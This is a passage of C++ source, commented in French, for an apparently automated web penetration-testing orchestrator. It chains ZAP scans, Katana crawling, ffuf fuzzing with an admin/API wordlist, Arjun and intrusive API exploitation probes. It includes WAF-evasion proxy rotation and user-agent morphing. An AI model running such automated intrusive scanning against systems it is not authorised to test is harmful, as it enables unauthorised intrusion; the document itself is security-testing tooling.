        logerr("[ZAP] scanAsUser failed for: " + url);
        return false;
    }

    std::string scanId = j.value("scan", std::string());
    if (scanId.empty()) return true;

    int last = -1;
    while (true) {
        json st;
        std::ostringstream ps;
        ps << "/JSON/ascan/view/status/?scanId=" << scanId;
        if (!zap_api_json_get(opt, ps.str(), st)) break;
        try {
            int p = std::stoi(st.value("status", std::string("0")));
            if (p != last) {
                render_progress_percent(p);
                last = p;
            }
            if (p >= 100) break;
        } catch (...) { break; }
        std::this_thread::sleep_for(std::chrono::milliseconds(700));
    }
    if (last < 100) render_progress_percent(100);
    std::cout << std::endl;

    if (throttle_ms > 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds(throttle_ms));
    }
    return true;
}

// Simple helper pour écrire un fichier dans le workdir
static bool write_out(const std::filesystem::path &p, const std::string &content) {
    try {
        std::ofstream ofs(p, std::ios::binary);
        if (!ofs) return false;
        ofs << content;
        return true;
    } catch (...) {
        return false;
    }
}


// -----------------------------------------------------------------------------
// Orchestrateur Web (ZAP-CLI + MCP) — avec intégration Katana optionnelle
// ET fallback robuste si MCP ne fournit pas d'URLs
// -----------------------------------------------------------------------------
static bool run_agentfactory(const AgentOptions &opt){
    // Banner
    print_dark_moon();
    loginfo(std::string(ansi::sky) + "AgentFactory start (delegating to ZAP-CLI: " + opt.zapcli_path + ")" + ansi::reset);

    // per-run workdir
    std::string hostpart = extract_hostname(opt.baseurl);
    std::string ts = current_datetime_string();
    fs::path workdir = fs::path(opt.outdir) / (hostpart + "_" + ts);
    try {
        fs::create_directories(workdir);
    } catch (const std::exception &ex) {
        logerr(std::string("Failed to create output dir: ") + ex.what());
        return false;
    }

    // 1) Phase DVGA GraphQL autopwn (si baseurl pointe DVGA)
    /*
    bool dvga_autopwn = (opt.baseurl.find("dvga") != std::string::npos);
    if (dvga_autopwn) {
        loginfo(std::string(ansi::yellow) +
                "[DVGA] GraphQL autopwn pre-phase enabled on baseurl=" + opt.baseurl +
                ansi::reset);

        bool ok_dvga = run_graphql_autopwn_mcp(opt, workdir);
        if (!ok_dvga) {
            logerr("[DVGA] run_graphql_autopwn_mcp failed (continuing with standard AgentFactory pipeline).");
        }
    }*/

    std::cout << ansi::green << "Workdir:" << ansi::reset
              << " " << ansi::white << workdir.string() << ansi::reset << std::endl;

    // -------------------------------------------------------------
    // 0bis) ZAP advanced setup: context import, proxy, scripts, UA
    // -------------------------------------------------------------
    if (!opt.apikey.empty()) {
        // Proxy chain (anti-WAF / rotation IP gérée en externe par l'utilisateur)
        if (opt.zap_enable_proxy_chain && !opt.zap_proxy_host.empty() && opt.zap_proxy_port != 0) {
            loginfo(std::string(ansi::sky) + "[ZAP] Configure proxy chain " +
                    opt.zap_proxy_host + ":" + std::to_string(opt.zap_proxy_port) + ansi::reset);
            zap_set_proxy_chain(opt, opt.zap_proxy_host, opt.zap_proxy_port);
        }

        // Import context (auth, users, login, etc.)
        if (!opt.zap_context_file.empty()) {
            loginfo(std::string(ansi::sky) + "[ZAP] Import context file: " +
                    opt.zap_context_file + ansi::reset);
            zap_import_context(opt, opt.zap_context_file);
        }

        // Mettre le contexte in-scope
        if (!opt.zap_context_name.empty()) {
            zap_set_context_in_scope(opt, opt.zap_context_name, true);
        }

        // User-Agent par défaut (morphing simple)
        if (!opt.zap_default_user_agent.empty()) {
            zap_set_default_user_agent(opt, opt.zap_default_user_agent);
        }

        // Scripts avancés : login Zest, header morphing, custom checks...
        if (!opt.zap_scripts.empty()) {
            loginfo(std::string(ansi::sky) + "[ZAP] Loading scripts (" +
                    std::to_string(opt.zap_scripts.size()) + ")" + ansi::reset);
            for (const auto &s : opt.zap_scripts) {
                zap_load_script(opt, s);
            }
            // Exécuter les standalone (souvent: login flows, scénarios business-logic)
            for (const auto &s : opt.zap_scripts) {
                if (s.standalone) {
                    loginfo(std::string(ansi::sky) + "[ZAP] Run standalone script: " +
                            s.name + ansi::reset);
                    zap_run_standalone_script(opt, s.name);
                }
            }
        }
    }

    // -------------------------------------------------------------
    // 0) Helpers inline
    // -------------------------------------------------------------
    auto http_status = [&](const std::string& url)->int{
        // Renvoie le code HTTP (0 si inconnu). On accepte 2xx/3xx comme "OK".
        std::string so, se;
#ifdef _WIN32
        // Essai curl (souvent présent sur Win10+)
        std::string cmd = "curl -sS -o NUL -w \"%{http_code}\" -L --max-time 10 " + quote(url);
        run_command_capture(cmd, so, se, 15000, false);
        int code = 0;
        if (!so.empty()) {
            try { code = std::stoi(so.substr(0,3)); } catch(...) { code = 0; }
        }
        // Fallback PowerShell si code nul
        if (code == 0) {
            so.clear(); se.clear();
            std::ostringstream ps;
            ps << "powershell -NoLogo -NoProfile -Command "
               << "\"$u=" << quote(url) << ";"
               << "try { $r=Invoke-WebRequest -UseBasicParsing -Method Head -MaximumRedirection 5 -TimeoutSec 10 -Uri $u; "
               << "if($r.StatusCode){ $r.StatusCode } else { 200 } } "
               << "catch { if($_.Exception.Response -and $_.Exception.Response.StatusCode){ "
               << "$_.Exception.Response.StatusCode.Value__ } else { 0 } }\"";
            run_command_capture(ps.str(), so, se, 20000, false);
            try { code = std::stoi(so); } catch(...) { code = 0; }
        }
        return code;
#else
        // POSIX -> curl
        std::ostringstream c;
        c << "curl -sS -o /dev/null -w \"%{http_code}\" -L --max-time 10 " << quote(url);
        run_command_capture(c.str(), so, se, 15000, false);
        int code = 0;
        if (!so.empty()) {
            try { code = std::stoi(so.substr(0,3)); } catch(...) { code = 0; }
        }
        return code;
#endif
    };

    auto is_good_code = [&](int code)->bool { return code >= 200 && code < 400; };

    auto dedup_push = [](std::unordered_set<std::string>& seen, std::vector<std::string>& vec, const std::string& u){
        if (u.size() < 10) return;
        if (seen.insert(u).second) vec.push_back(u);
    };


    // stocke tous les CSV ffuf générés (root, api, admin, v1)
    std::vector<fs::path> ffuf_csv_files;

    // -------------------------------------------------------------
    // 1) Katana FIRST: découverte + filtre des URLs qui répondent
    // -------------------------------------------------------------
    std::vector<std::string> katana_urls_ok;
    std::unordered_set<std::string> seen_ok;

    if (g_use_katana) {
        std::cout << ansi::green << "[KATANA] Start crawling (first)." << ansi::reset << std::endl;

        const std::string katana_bin = resolve_katana_bin(g_katana_bin_explicit);
        std::string so, se;
        fs::path katana_out = workdir / "recon_katana_urls.txt";

        if (!run_katana_to_file(katana_bin, opt.baseurl, g_katana_passthrough, katana_out, so, se)) {
            logerr("[KATANA] execution failed — continuing without Katana URLs.");
        } else {
            // -----------------------------------------------
            // 1.a) Filtrage Katana par code HTTP
            // -----------------------------------------------
            std::string ktxt = readFile(katana_out.string());
            std::istringstream iss(ktxt);
            std::string line; 
            int tested = 0, okcnt = 0;

            while (std::getline(iss, line)) {
                if (line.size() < 10) continue;
                while (!line.empty() && (line.back()=='\r' || line.back()==' ')) line.pop_back();
                if (line.empty()) continue;

                int code = http_status(line);
                tested++;
                if (is_good_code(code)) {
                    dedup_push(seen_ok, katana_urls_ok, line);
                    okcnt++;
                }
            }

            // Sauvegarde liste filtrée (Katana ONLY pour le moment)
            try {
                std::ofstream okf(workdir / "recon_katana_urls_ok.txt");
                for (auto &u : katana_urls_ok) okf << u << "\n";
            } catch (...) {}

            std::vector<std::pair<std::string,std::string>> rows;
            rows.emplace_back("Katana discovered (raw)", std::to_string(tested));
            rows.emplace_back("Katana OK (2xx/3xx)", std::to_string((int)katana_urls_ok.size()));
            print_kv_table(rows, {"Katana discovered (raw)","Katana OK (2xx/3xx)"});

            // -----------------------------------------------
            // 1.b) Wordlist dynamique pour ffuf à partir des URLs Katana
            // -----------------------------------------------
            auto build_dynamic_wordlist_from_urls = [&](const std::vector<std::string> &urls) -> fs::path {
                using std::string;
                std::vector<string> tokens;

                auto push_token = [&](string t){
                    if (t.empty()) return;
                    // normalisation
                    std::transform(t.begin(), t.end(), t.begin(),
                                   [](unsigned char c){ return (char)std::tolower(c); });
                    if (t.size() < 2 || t.size() > 64) return;
                    bool alldig = true;
                    for (char c : t) {
                        if (!std::isdigit((unsigned char)c)) { alldig = false; break; }
                    }
                    if (alldig) return;
                    tokens.push_back(t);
                };

                for (const auto &u : urls) {
                    if (u.size() < 10) continue;
                    auto pu = parse_url(u);
                    std::string merged = pu.path;
                    if (!pu.query.empty()) {
                        merged.push_back('?');
                        merged += pu.query;
                    }

                    auto parts = split_tokens(merged, "/\\?&=.:;,_-#");
                    for (auto &p : parts) push_token(p);

                    // host hints (api, v1, etc.)
                    if (!pu.host.empty()) {
                        auto hparts = split_tokens(pu.host, ".-");
                        for (auto &h : hparts) push_token(h);
                    }
                }

                // Mots-clés supplémentaires "classiques" pour API/admin
                const char* static_words[] = {
                    // API / versions / RPC
                    "api","apis","apiv1","apiv2","apiv3",
                    "v1","v2","v3","v4",
                    "rest","rpc","soap","ws","webservice","services",
                    "graphql","gql","playground","voyager","graphiql",

                    // Auth / session / compte
                    "auth","oauth","oidc",
                    "login","logout","signin","signup","register","registration",
                    "callback","redirect","consent",
                    "user","users","account","accounts","profile","me",
                    "session","sessions","token","tokens","refresh","password","reset","forgot",

                    // Admin / backoffice
                    "admin","administrator","backend","backoffice","manager","console",
                    "dashboard","panel","cp","cms",

                    // E-commerce / domaine métier courant
                    "cart","basket","checkout","order","orders",
                    "product","products","item","items","shop","store","catalog","inventory",
                    "payment","payments","invoice","billing","subscription","subscriptions",

                    // Fichiers / upload / download
                    "upload","uploads","file","files","media",
                    "download","downloads","export","import","report","reports","logs","log",

                    // Recherche / filtres
                    "search","query","filter","filters","find","lookup","browse","list","lists",

                    // Config / debug / health
                    "config","configs","configuration","settings","preferences",
                    "debug","test","tests","testing","qa","staging","dev","development",
                    "health","healthcheck","status","metrics","info","version","env",

                    // Sécurité / contrôle d’accès
                    "acl","roles","permissions","policy","policies","security","adminonly",

                    // Java / Spring / JEE
                    "spring","springboot","actuator","jmx","servlet","jsp","servlets",
                    "struts","jsf","jaxrs","resteasy","jersey",

                    // PHP / CMS / frameworks
                    "php","phpinfo","phpmyadmin",
                    "wp","wpadmin","wpcontent","wplogin",
                    "wordpress","drupal","joomla","prestashop","magento",
                    "laravel","symfony","codeigniter","yii","cakephp",

                    // Static / assets / front
                    "assets","static","public","dist","build","bundle",
                    "js","javascript","css","img","image","images","fonts",

                    // API business génériques
                    "customer","customers","client","clients",
                    "company","companies","project","projects",
                    "ticket","tickets","support","help","contact","contacts",

                    // Webhooks / intégrations / misc
                    "webhook","webhooks","hook","hooks",
                    "integration","integrations","slack","github","gitlab","bitbucket",
                    "sso","saml","ldap","kerberos",

                    // Divers fréquents
                    "home","index","main","api2","mobile","internal","private","publicapi",
                    "legacy","old","archive","beta","alpha"
                };

                for (auto *w : static_words) tokens.emplace_back(w);

                uniq_prune(tokens, 10000);

                std::string host = extract_hostname(opt.baseurl);
                if (host.empty()) host = "target";
                for (char &c : host) {
                    if (!(std::isalnum((unsigned char)c) || c=='-' || c=='_')) c = '_';
                }

                fs::path wl = workdir / ("dynamic_" + host + "_paths.txt");
                try {
                    std::ofstream ofs(wl);
                    for (auto &t : tokens) ofs << t << "\n";
                    loginfo(std::string(ansi::sky) + "[KATANA/FFUF] Dynamic wordlist written: " 
                            + wl.string() + " (" + std::to_string(tokens.size()) + " entries)" + ansi::reset);
                } catch (...) {
                    logerr("[KATANA/FFUF] Cannot write dynamic wordlist: " + wl.string());
                }
                return wl;
            };

            fs::path dynamic_wordlist;
            if (!katana_urls_ok.empty()) {
                dynamic_wordlist = build_dynamic_wordlist_from_urls(katana_urls_ok);
            }

            // -----------------------------------------------
            // 1.c) FFUF Round 1 : fuzzing intelligent sur /, /api, /admin, /v1
            // -----------------------------------------------
#ifndef _WIN32
            if (!dynamic_wordlist.empty() && fs::exists(dynamic_wordlist)) {
                std::string base_root = opt.baseurl;
                while (!base_root.empty() && base_root.back()=='/') base_root.pop_back();

                std::vector<std::string> bases = {"", "api", "admin", "v1"};

                for (const auto &b : bases) {
                    std::string label = b.empty() ? "root" : b;
                    fs::path outcsv = workdir / ("recon_ffuf_" + label + ".csv");

                    std::string target;
                    if (b.empty()) {
                        target = base_root + "/FUZZ";
                    } else {
                        target = base_root + "/" + b + "/FUZZ";
                    }

                    std::ostringstream cmd;
                    cmd << "ffuf"
                        << " -u " << quote(target)
                        << " -w " << quote(dynamic_wordlist.string())
                        // On garde tout ce qui répond (200–599)...
                        << " -mc 200-599"
                        // ... sauf les 404 qu'on ne veut jamais voir
                        << " -fc 404"
                        << " -recursion -recursion-depth 2"
                        << " -of csv -o " << quote(outcsv.string());

                    std::string so_ffuf, se_ffuf;
                    loginfo(std::string(ansi::sky) + "[FFUF] Fuzzing " + target 
                            + " with " + dynamic_wordlist.string() + ansi::reset);
                    run_command_capture(cmd.str(), so_ffuf, se_ffuf, 0, false);
                    write_out(workdir / ("recon_ffuf_" + label + "_stdout.txt"), so_ffuf + "\n" + se_ffuf);
                    ffuf_csv_files.push_back(outcsv);
                }

                // Merge des résultats FFUF dans katana_urls_ok
                for (const auto &csvpath : ffuf_csv_files) {
                    if (!fs::exists(csvpath)) continue;
                    try {
                        std::ifstream ifs(csvpath);
                        std::string l;
                        bool first = true;
                        while (std::getline(ifs, l)) {
                            if (first) { first = false; continue; } // header
                            if (l.empty()) continue;

                            // 1ère colonne = valeur FUZZ (token)
                            std::string token;
                            size_t pos = l.find(',');
                            if (pos == std::string::npos) token = l;
                            else token = l.substr(0, pos);

                            // strip guillemets éventuels
                            if (!token.empty() && token.front()=='"') token.erase(0,1);
                            if (!token.empty() && token.back()=='"') token.pop_back();
                            if (token.empty()) continue;

                            // Déduire le label à partir du nom de fichier
                            std::string label;
                            auto s = csvpath.filename().string();
                            if (s.find("recon_ffuf_root") != std::string::npos) label = "";
                            else if (s.find("recon_ffuf_api") != std::string::npos) label = "api";
                            else if (s.find("recon_ffuf_admin") != std::string::npos) label = "admin";
                            else if (s.find("recon_ffuf_v1") != std::string::npos) label = "v1";

                            std::string full = base_root;
                            if (label.empty()) {
                                full += "/" + token;
                            } else {
                                full += "/" + label + "/" + token;
                            }

                            int code2 = http_status(full);
                            if (is_good_code(code2)) {
                                dedup_push(seen_ok, katana_urls_ok, full);
                            }
                        }
                    } catch (...) {
                        logerr("[FFUF] Failed to parse CSV: " + csvpath.string());
                    }
                }

                // Re-dump avec URLs Katana + FFUF
                try {
                    std::ofstream okf2(workdir / "recon_katana_urls_ok.txt");
                    for (auto &u : katana_urls_ok) okf2 << u << "\n";
                } catch (...) {}
            } else {
                loginfo("[FFUF] Skipping fuzzing (empty or missing dynamic wordlist).");
            }
#else
            (void)dynamic_wordlist; // pas de ffuf sous Windows pour l'instant
#endif

            // -----------------------------------------------
            // 1.d) ARJUN : découverte de paramètres HTTP
            // -----------------------------------------------
#ifndef _WIN32
            if (!katana_urls_ok.empty()) {
                fs::path arjun_out = workdir / "recon_arjun_params.txt";
                std::ostringstream cmd;
                cmd << "arjun"
                    << " -i " << quote((workdir / "recon_katana_urls_ok.txt").string())
                    << " -oT " << quote(arjun_out.string());

                std::string so_arj, se_arj;
                loginfo(std::string(ansi::sky) + "[ARJUN] Discovering parameters from Katana/FFUF URLs" + ansi::reset);
                run_command_capture(cmd.str(), so_arj, se_arj, 0, false);
                write_out(workdir / "recon_arjun_stdout.txt", so_arj + "\n" + se_arj);

                // Best-effort : extraire des URLs complètes de recon_arjun_params.txt et les merger
                if (fs::exists(arjun_out)) {
                    try {
                        std::ifstream ifs(arjun_out);
                        std::string l;
                        while (std::getline(ifs, l)) {
                            if (l.find("http://") == std::string::npos &&
                                l.find("https://") == std::string::npos) continue;
                            size_t pos = l.find("http");
                            size_t end = l.find(' ', pos);
                            std::string url = (end == std::string::npos) ? l.substr(pos) : l.substr(pos, end-pos);
                            while (!url.empty() && (url.back()=='\r' || url.back()==' ')) url.pop_back();
                            if (url.empty()) continue;

                            int code3 = http_status(url);
                            if (is_good_code(code3)) {
                                dedup_push(seen_ok, katana_urls_ok, url);
                            }
                        }

                        // Re-dump final Katana+FFUF+ARJUN
                        std::ofstream okf3(workdir / "recon_katana_urls_ok.txt");
                        for (auto &u : katana_urls_ok) okf3 << u << "\n";
                    } catch (...) {
                        logerr("[ARJUN] Failed to merge Arjun URLs into Katana OK list.");
                    }
                }
            }
#endif
        }
    }

    // -------------------------------------------------------------
    // 2) Warm-up passif ZAP: URLs Katana OK (ou fallback seeds)
    // -------------------------------------------------------------
    if (!katana_urls_ok.empty()) {
        std::cout << ansi::sky << "[ZAP] Passive warm-up with Katana OK URLs (" 
                  << katana_urls_ok.size() << ")" << ansi::reset << std::endl;
        zap_access_urls_bulk(opt.host, opt.port, opt.apikey, katana_urls_ok);
    } else {
        // Fallback minimal si Katana n'a rien trouvé
        std::vector<std::string> seeds = {
            opt.baseurl,
            opt.baseurl + (opt.baseurl.back()=='/'? "" : "/")
        };
        std::cout << ansi::sky << "[ZAP] Passive warm-up with seeds (fallback)" << ansi::reset << std::endl;
        zap_access_urls_bulk(opt.host, opt.port, opt.apikey, seeds);
    }

    // Petit spider court pour étoffer le passif (best-effort, non bloquant)
    {
        std::string so,se;
        run_zapcli(opt.zapcli_path, opt.host, opt.port, opt.apikey, opt.baseurl, "spider", workdir, so, se);
    }

        // Ajax spider (pour applis très JS-heavy)
    if (opt.zap_use_ajax_spider) {
        loginfo(std::string(ansi::sky) + "[ZAP] Ajax spider on baseurl (auth or not, depending on context)." + ansi::reset);
        zap_ajax_spider(opt, opt.baseurl);
    }

    // Spider authentifié par user (scanAsUser) si contexte + users configurés
    if (!opt.zap_context_name.empty() && !opt.zap_auth_users.empty()) {
        int ctx_id = zap_get_context_id(opt, opt.zap_context_name);
        if (ctx_id >= 0) {
            for (const auto &user : opt.zap_auth_users) {
                int uid = zap_get_user_id(opt, ctx_id, user);
                if (uid < 0) continue;
                loginfo(std::string(ansi::sky) + "[ZAP] Authenticated spiderAsUser for '" +
                        user + "' on " + opt.baseurl + ansi::reset);
                zap_spider_as_user(opt, ctx_id, uid, opt.baseurl);
            }
        } else {
            logerr("[ZAP] Cannot resolve context id for authenticated spider.");
        }
    }

    // -------------------------------------------------------------
    // 3) Récup passif: ZAP-CLI list -> alerts_*.json
    // -------------------------------------------------------------
    std::string out, err;
    if (!run_zapcli(opt.zapcli_path, opt.host, opt.port, opt.apikey, opt.baseurl, "list", workdir, out, err)) {
        logerr("ZAP-CLI 'list' invocation failed. stdout/stderr:\n" + out + "\n" + err);
        // On continue malgré tout; le flow MCP/recon peut encore servir
    }

    fs::path alerts_path = find_latest_alerts_json(workdir);
    json alerts_before = json::object();
    alerts_before["alerts"] = json::array();

    if (!alerts_path.empty()) {
        try {
            std::string txt = readFile(alerts_path.string());
            alerts_before = json::parse(txt);
        } catch (const std::exception &ex) {
            logerr(std::string("Failed to parse alerts JSON: ") + ex.what());
        }
    } else {
        logerr("No alerts_*.json produced by ZAP-CLI in " + workdir.string());
        loginfo("ZAP-CLI stdout:\n" + out + "\n" + err);
    }

    // Filtre Medium/High
    json filtered; filtered["alerts"] = json::array();
    if (alerts_before.contains("alerts") && alerts_before["alerts"].is_array()) {
        for (const auto &a : alerts_before["alerts"]) {
            std::string risk = a.value("risk", "");
            if (risk == "Medium" || risk == "High") filtered["alerts"].push_back(a);
        }
    }
    fs::path filtered_path = workdir / "alerts_filtered.json";
    try { std::ofstream f(filtered_path); f << std::setw(2) << filtered; } catch (...) {
        logerr("Failed to write alerts_filtered.json");
    }

    // Récap compact
    print_compact_alerts_summary(alerts_before, workdir);

    // -------------------------------------------------------------
    // 4) RECON (après warm-up passif, comme demandé: "et enchaîner avec le reste")
    // -------------------------------------------------------------
    std::vector<fs::path> recon_files;
    std::cout << ansi::sky << "[RECON] Launching chained reconnaissance..." << ansi::reset << std::endl;
    run_recon_web_chain(opt.baseurl, workdir, recon_files);
    if (!recon_files.empty()) {
        std::vector<std::pair<std::string,std::string>> rrows;
        for (const auto& p : recon_files) rrows.emplace_back("recon", p.filename().string());
        print_kv_table(rrows, {"recon"});
    }

    // Wayback fusion plus tard
    std::string wayback_txt = readFile((workdir/"recon_waybackurls.txt").string());
        // -------------------------------------------------------------
    // 4bis) Phase API : REST / GraphQL / Gateway (flows heuristiques)
    // -------------------------------------------------------------
    if (g_intrusive_mode) {
        loginfo(std::string(ansi::bold) +
                "[API] Phase REST/GraphQL heuristique (flow principal)..." +
                ansi::reset);

        std::vector<ConfirmationCommand> api_plan;
        nlohmann::json api_plan_json = nlohmann::json::object();

        append_api_flows(opt.baseurl, workdir, api_plan, api_plan_json);

        if (!api_plan.empty()) {
            std::vector<fs::path> api_outputs;
            execute_confirmation_plan(api_plan, workdir, api_outputs);

            // Consolidation API (REST/GraphQL/gateway) pour les rapports
            analyse_postexploit_results_api(opt.baseurl, workdir);
        } else {
            loginfo("[API] Aucun endpoint REST/GraphQL exploitable detecte.");
        }
    }


    // -------------------------------------------------------------
    // 5) Phase MCP (+ fallback) pour construire la targetlist d'AScan
    // -------------------------------------------------------------
    fs::path exe_parent = get_exe_parent_dir();
    std::string sanitized = opt.baseurl; 
    std::replace(sanitized.begin(), sanitized.end(), '/', '_'); 
    std::replace(sanitized.begin(), sanitized.end(), ':', '_');
    fs::path mcp_urls = workdir / ("mcp_urls_" + sanitized + ".json");

    // Affichage MCP (non bloquant)
    {
        std::string mcp_display_raw;
        call_mcp_display_with_file(opt.mcp_path, filtered_path, exe_parent, mcp_display_raw);
    }

    bool filtered_has_alerts = false;
    try {
        std::string ft = readFile(filtered_path.string());
        json fj = json::parse(ft, nullptr, false);
        filtered_has_alerts = ( !fj.is_discarded() && fj.contains("alerts") && fj["alerts"].is_array() && !fj["alerts"].empty() );
    } catch(...) {}

    json mcp_j; 
    mcp_j["urls"] = json::array();

    if (filtered_has_alerts) {
        std::string mcp_out;
        if (call_mcp_analyze(opt.mcp_path, filtered_path, mcp_urls, mcp_out)) {
            try {
                std::string txt = readFile(mcp_urls.string());
                json tmp = json::parse(txt, nullptr, false);
                if (!tmp.is_discarded() && tmp.contains("urls") && tmp["urls"].is_array() && !tmp["urls"].empty()) {
                    mcp_j = std::move(tmp);
                }
            } catch(...) {}
        }
    }

    // Fallback seed si MCP vide
    if (!mcp_j.contains("urls") || !mcp_j["urls"].is_array() || mcp_j["urls"].empty()) {
        mcp_j = json::object();
        mcp_j["urls"] = json::array({
            { {"url", opt.baseurl}, {"justification", "Bootstrap: base URL"} }
        });
    }

    // Merge des URLs Katana OK (priorisées), déduplication
    // Merge FFUF + ARJUN + KATANA in MCP targetlist
    {
        std::unordered_set<std::string> seen;

        // Import déjà existant
        if (mcp_j.contains("urls") && mcp_j["urls"].is_array()) {
            for (auto &e : mcp_j["urls"]) {
                if (e.contains("url")) seen.insert(e["url"].get<std::string>());
            }
        }

        int added_ffuf = 0;
        int added_arjun = 0;
        int added_katana = 0;

        // ------------------------------------------------------------
        // 1) Merge FFUF (toutes les CSV recon_ffuf_*.csv)
        // ------------------------------------------------------------
        for (const auto& csvpath : ffuf_csv_files)
        {
            if (!fs::exists(csvpath)) continue;

            std::ifstream ifs(csvpath);
            std::string line;
            bool first = true;

            // base_root = opt.baseurl stabilisé
            std::string base_root = opt.baseurl;
            while (!base_root.empty() && base_root.back() == '/') base_root.pop_back();

            while (std::getline(ifs, line)) {
                if (first) { first = false; continue; }
                if (line.empty()) continue;

                // token = premier champ CSV
                std::string token = line.substr(0, line.find(','));
                if (token.empty()) continue;

                std::string full = base_root + "/" + token;

                if (seen.insert(full).second) {
                    mcp_j["urls"].push_back({
                        {"url", full},
                        {"justification", "Discovered via FFUF"}
                    });
                    added_ffuf++;
                }
            }
        }

        // ------------------------------------------------------------
        // 2) Merge ARJUN (recon_arjun_params.txt)
        // ------------------------------------------------------------
        fs::path arjun_out = workdir / "recon_arjun_params.txt";
        if (fs::exists(arjun_out)) {
            std::ifstream ifs(arjun_out);
            std::string l;

            while (std::getline(ifs, l)) {
                size_t pos = l.find("http");
                if (pos == std::string::npos) continue;

                std::string url = l.substr(pos);
                while (!url.empty() && (url.back()=='\r' || url.back()==' ')) url.pop_back();

                if (url.empty()) continue;

                if (seen.insert(url).second) {
                    mcp_j["urls"].push_back({
                        {"url", url},
                        {"justification", "Discovered via ARJUN"}
                    });
                    added_arjun++;
                }
            }
        }

        // ------------------------------------------------------------
        // 3) Merge KATANA OK
        // ------------------------------------------------------------
        for (const auto& u : katana_urls_ok) {
            if (seen.insert(u).second) {
                mcp_j["urls"].push_back({
                    {"url", u},
                    {"justification", "Discovered via Katana (OK)"}
                });
                added_katana++;
            }
        }

        // Logging combiné
        std::cout << ansi::green
                << "[+] Added " << added_katana << " Katana URLs, "
                << added_ffuf << " FFUF URLs, "
                << added_arjun << " ARJUN URLs to MCP list"
                << ansi::reset << std::endl;

        // Sauvegarde finale
        try {
            std::ofstream ofs(mcp_urls);
            ofs << std::setw(2) << mcp_j;
        } catch(...) {
            logerr("Failed to write merged MCP URL file");
        }
    }

    // Fusion avec WaybackURLs
    try {
        std::string txt = readFile(mcp_urls.string());
        json j = json::parse(txt, nullptr, false);
        if (!j.is_discarded()) {
            std::istringstream iss(wayback_txt);
            std::string line; int added=0;
            std::unordered_set<std::string> seen;
            if (j.contains("urls") && j["urls"].is_array()) {
                for (auto& u : j["urls"]) if (u.contains("url")) seen.insert(u["url"].get<std::string>());
            }
            while (std::getline(iss, line)) {
                if (line.size() < 10) continue;
                if (seen.insert(line).second) {
                    j["urls"].push_back(json{{"url", line}, {"justification", "Discovered via waybackurls"}});
                    added++;
                }
            }
            if (added > 0) {
                std::ofstream ofs(mcp_urls); ofs << std::setw(2) << j;
                std::cout << ansi::green << "[RECON] Added " << added
                          << " wayback URLs into MCP target list" << ansi::reset << std::endl;
            }
            mcp_j = std::move(j);
        }
    } catch (...) {}

    print_header_box("Start Pentest");

    fs::path last_active_alerts;

    std::vector<std::string> all_targets;
    all_targets.reserve(mcp_j["urls"].size());

    // Petit helper commun pour éviter le copier/coller
    auto process_target_entry = [&](const nlohmann::json &entry) {
        if (!entry.contains("url")) return;

        std::string target = entry.value("url", std::string());
        if (target.empty()) return;

        std::string justification = entry.value("justification", std::string());
        all_targets.push_back(target);

        print_target_box(target, justification);

        // -------------------------------------------------------------
        // 1) Scan global (non auth) via ZAP-CLI — pour TOUTES les URLs
        // -------------------------------------------------------------
        std::string out2, err2;
        bool ok_ascan = run_zapcli_ascan_progress(
            opt.zapcli_path, opt.host, opt.port, opt.apikey,
            target, workdir, out2, err2
        );
        if (!ok_ascan) {
            logerr("ZAP-CLI ascan failed for target: " + target);
            return; // pas d'API flow si le scan de base foire
        }

        fs::path latest_alerts_after = find_latest_alerts_json(workdir);
        if (!latest_alerts_after.empty()) {
            last_active_alerts = latest_alerts_after;
        }

        // -------------------------------------------------------------
        // 2) Flows API (REST / GraphQL / Gateway)
        //    → UNIQUEMENT pour les URLs issues de FFUF
        // -------------------------------------------------------------
        bool is_ffuf = (justification.find("FFUF") != std::string::npos);

        if (is_ffuf) {
            std::cout << ansi::sky
                    << "[API] Building REST/GraphQL flow for FFUF target "
                    << target << ansi::reset << std::endl;

            std::vector<ConfirmationCommand> api_plan;
            nlohmann::json api_plan_json = nlohmann::json::object();

            // On passe bien la target (URL MCP) à l'orchestrateur API
            append_api_flows(target, workdir, api_plan, api_plan_json);

            if (!api_plan.empty()) {
                std::cout << ansi::sky
                        << "[API] Executing " << api_plan.size()
                        << " API probes for FFUF target "
                        << target << ansi::reset << std::endl;

                std::vector<fs::path> api_outputs;
                execute_confirmation_plan(api_plan, workdir, api_outputs);

                analyse_postexploit_results_api(target, workdir);

                std::cout << ansi::green
                        << "[API] Completed API flows for FFUF target "
                        << target << ansi::reset << std::endl;
            } else {
                std::cout << ansi::yellow
                        << "[API] No REST/GraphQL surface detected for FFUF target "
                        << target << ansi::reset << std::endl;
            }
        } else {
            // Juste un scan ZAP classique, pas de surcharge API
            std::cout << ansi::blue
                    << "[API] Skipping API flows for non-FFUF target "
                    << target << ansi::reset << std::endl;
        }

        // Throttle léger
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    };

    // -------------------------------------------------------------
    // PASS 1 : traiter d'abord toutes les URLs FFUF
    // -------------------------------------------------------------
    for (const auto &entry : mcp_j["urls"]) {
        std::string justification = entry.value("justification", std::string());
        if (justification.find("Discovered via FFUF") == std::string::npos)
            continue;
        process_target_entry(entry);
    }

    // -------------------------------------------------------------
    // PASS 2 : traiter ensuite toutes les autres URLs (Katana, Arjun, Wayback...)
    // -------------------------------------------------------------
    for (const auto &entry : mcp_j["urls"]) {
        std::string justification = entry.value("justification", std::string());
        if (justification.find("Discovered via FFUF") != std::string::npos)
            continue;
        process_target_entry(entry);
    }

    // ---------------- Authenticated Active Scan (scanAsUser) ----------------
    if (!opt.zap_context_name.empty() && !opt.zap_auth_users.empty()) {
        int ctx_id = zap_get_context_id(opt, opt.zap_context_name);
        if (ctx_id < 0) {
            logerr("[ZAP] Cannot resolve context id for authenticated ascan.");
        } else {
            // Filtre des URLs à scanner en auth en fonction des prefixes (focus /api, /admin, etc.)
            std::vector<std::string> auth_targets;
            if (!opt.zap_focus_prefixes.empty()) {
                for (const auto &u : all_targets) {
                    bool keep = false;
                    for (const auto &pref : opt.zap_focus_prefixes) {
                        if (!pref.empty() && u.find(pref) != std::string::npos) {
                            keep = true; break;
                        }
                    }
                    if (keep) auth_targets.push_back(u);
                }
            } else {
                auth_targets = all_targets; // fallback: tout
            }

            if (!auth_targets.empty()) {
                std::cout << ansi::sky << "[ZAP] Authenticated AScan on "
                          << auth_targets.size() << " high-value URLs." << ansi::reset << std::endl;
            }

            for (const auto &user : opt.zap_auth_users) {
                int uid = zap_get_user_id(opt, ctx_id, user);
                if (uid < 0) {
                    logerr("[ZAP] Skipping authenticated AScan for user '" + user + "' (id not found).");
                    continue;
